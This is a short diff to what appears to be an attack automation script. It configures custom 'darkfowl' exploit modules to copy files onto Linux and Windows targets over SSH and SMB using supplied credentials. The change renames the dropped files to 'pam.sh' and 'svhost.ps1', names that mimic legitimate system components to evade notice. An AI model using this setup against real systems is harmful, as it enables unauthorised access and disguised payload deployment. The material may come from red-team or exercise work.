@@ -11,7 +11,7 @@ echo -e "
 use exploit/darkfowl_ssh
 set RHOSTS $Linux_TARGETS
 set LOCALLOCATION $Linux_FILE
-set REMOTELOCATION /tmp/logs/hey.sh
+set REMOTELOCATION /tmp/logs/pam.sh
 set USERNAME $Linux_USERNAME
 set PASSWORD $Linux_PASSWORD
 set disablepayloadhandler true
@@ -19,7 +19,7 @@ run
 use exploit/darkfowl_window
 set RHOSTS $Windows_TARGETS
 set LOCALLOCATION $Windows_FILE
-set REMOTELOCATION yeet.ps1
+set REMOTELOCATION svhost.ps1
 set SMBUser $Windows_USERNAME
 set SMBPass $Windows_PASSWORD
 run
